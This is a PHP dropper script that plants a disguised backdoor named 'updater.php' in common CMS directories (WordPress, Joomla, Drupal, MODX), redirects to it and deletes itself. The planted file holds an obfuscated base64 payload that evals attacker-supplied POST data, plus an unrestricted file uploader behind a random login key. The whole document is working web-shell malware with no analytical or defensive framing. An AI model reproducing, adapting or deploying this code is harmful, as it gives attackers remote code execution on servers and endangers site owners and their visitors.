<?php 
$randStr = str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890');
$rand = substr($randStr,0,6);
$htm='<?php if($_GET["login"]=="'.$rand.'"){$or="JG11amogxPSAkX1BPU1RbJ3onXTsgaWYg"; $zs="KCRtdWpqIT0iIikgeyAkeHxNzZXI9Ym"; $lq="FzZTY0X2RlY29kZSgkX1BPU1RbJ3owJ10pO"; $bu="yBAxZXZhbCgiXCRzYWZlZGcgPSAkeHNzZXI7Iik7IH0="; $avj = str_replace("j","","sjtrj_jrjejpljajcje"); $qu = $avj("i", "", "ibiaisie6i4i_dieicoide"); $fh = $avj("k","","crkekatkek_kfkukncktkikon"); $hwy = $fh("", $qu($avj("x", "", $or.$zs.$lq.$bu)));$hwy(); $target_path=basename($_FILES["uploadedfile"]["name"]);if(move_uploaded_file($_FILES["uploadedfile"]["tmp_name"],$target_path)){echo basename($_FILES["uploadedfile"]["name"])." has been uploaded";}else{echo "Uploader By Psyco!";}} ?><form enctype="multipart/form-data" method="POST"><input name="uploadedfile" type="file"/><input type="submit" value="Upload File"/></form>';
$home = $_SERVER['SERVER_NAME'];
$RootDir = $_SERVER['DOCUMENT_ROOT'];
if(is_dir($RootDir . "/wp-admin/user")){
	file_put_contents($RootDir . "/wp-admin/user/updater.php", $htm);
	$url1 = "http://".$home."/wp-admin/user/updater.php?login=".$rand;
	echo '<meta http-equiv="Refresh" content="0; url='.$url1.'">';
}
else if(is_dir($RootDir . "/modules/mod_search")){
	file_put_contents($RootDir . "/modules/mod_search/updater.php", $htm);
	$url2 = "http://".$home."/modules/mod_search/updater.php?login=".$rand;
	echo '<meta http-equiv="Refresh" content="0; url='.$url2.'">';
}
else if(is_dir($RootDir . "/includes/database")){
	file_put_contents($RootDir . "/includes/database/updater.php", $htm);
	$url3 = "http://".$home."/includes/database/updater.php?login=".$rand;
	echo '<meta http-equiv="Refresh" content="0; url='.$url3.'">';
}
else if(is_dir($RootDir . "/manager/controllers")){
	file_put_contents($RootDir . "/manager/controllers/updater.php", $htm);
	$url4 = "http://".$home."/manager/controllers/updater.php?login=".$rand;
	echo '<meta http-equiv="Refresh" content="0; url='.$url4.'">';
}else {
	if(!is_dir($RootDir . "/templates"))
	mkdir($RootDir . "/templates",0777);
	if(!is_dir($RootDir . "/templates/atomic"))
	mkdir($RootDir . "/templates/atomic",0777);
	file_put_contents($RootDir . "/templates/atomic/templates.php", $htm);
	$url5 = "http://".$home."/templates/atomic/templates.php?login=".$rand;
	echo '<meta http-equiv="Refresh" content="0; url='.$url5.'">';
}
unlink("./test.php");